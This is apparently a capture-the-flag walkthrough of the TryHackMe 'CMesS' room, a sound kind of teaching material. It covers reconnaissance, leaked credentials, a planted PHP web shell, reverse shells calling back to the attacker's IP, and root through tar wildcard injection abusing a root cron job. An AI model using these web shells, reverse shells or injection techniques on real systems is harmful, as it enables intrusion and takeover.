CTF URL: https://tryhackme.com/r/room/cmess
# IP
```
10.10.194.195
```
modify `/etc/hosts` with `10.10.194.195 cmess.thm`
# Reconaisance
## NMAP
```bash
nmap -p- -T4 cmess.thm -v
22
80

nmap -p22,80 -sS -sC -sV cmess.thm -v
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: Gila CMS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
## WEB
it is Gila CMS
### Dirb
```bash
dirb http://<ip>/
# result
/admin
```
### Wfuzz
subdomain brute force
```bash
wfuzz -c -f sub-fighter -w subd.txt -u 'http://cmess.thm' -H "Host: FUZZ.cmess.thm" --hw 290
# result 

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                              
=====================================================================

000000019:   200        30 L     104 W      934 Ch      "dev"  
```
# dev.cmess.thm
```

Development Log
andre@cmess.thm

Have you guys fixed the bug that was found on live?
support@cmess.thm

Hey Andre, We have managed to fix the misconfigured .htaccess file, we're hoping to patch it in the upcoming patch!
support@cmess.thm

Update! We have had to delay the patch due to unforeseen circumstances
andre@cmess.thm

That's ok, can you guys reset my password if you get a moment, I seem to be unable to get onto the admin panel.
support@cmess.thm

Your password has been reset. Here: KPFTN_f2yxe%

```
- `andre:KPFTN_f2yxe%`
- `.htaccess`
# Admin Page - Rev Shell
we have access to `http://cmess.thm/admin`

config.php
```
  array (
    'host' => 'localhost',
    'user' => 'root',
    'pass' => 'r0otus3rpassw0rd',
    'name' => 'gila',
  ),
```

addin cmd payload to `/src/cmd.php`
```php
<?php system($_GET['cmd']);?>
```
`http://cmess.thm/src/cmd.php?cmd=id` -> works

let's upload rev-shell payload - https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.8.97.245] from (UNKNOWN) [10.10.194.195] 48146
Linux cmess 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 00:33:24 up  1:38,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

# PrivEsc to User
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# ctrl+z
stty raw -echo; fg
```

```bash
www-data@cmess:/$ ls /opt -la
total 12
drwxr-xr-x  2 root root 4096 Feb  6  2020 .
drwxr-xr-x 22 root root 4096 Feb  6  2020 ..
-rwxrwxrwx  1 root root   36 Feb  6  2020 .password.bak
www-data@cmess:/$ cat /opt/.password.bak 
andres backup password
UQfsdCB7aAP6
```

```
andre@cmess:~$ whoami
andre
andre@cmess:~$ cat user.txt 
thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}

```
# PrivEsc to Root
```
andre@cmess:~$ cat backup/note 
Note to self.
Anything in here will be backed up! 
```

```
andre@cmess:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```
wildcard is over here which means it can be exploited
```bash
echo $'/usr/bin/python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.8.97.245\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")\'' > shell.sh

echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

```
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.97.245] from (UNKNOWN) [10.10.194.195] 50978
# whoami
whoami
root
# cat /root/root.txt
cat /root/root.txt
thm{9f85b7fdeb2cf96985bf5761a93546a2}
# 
```

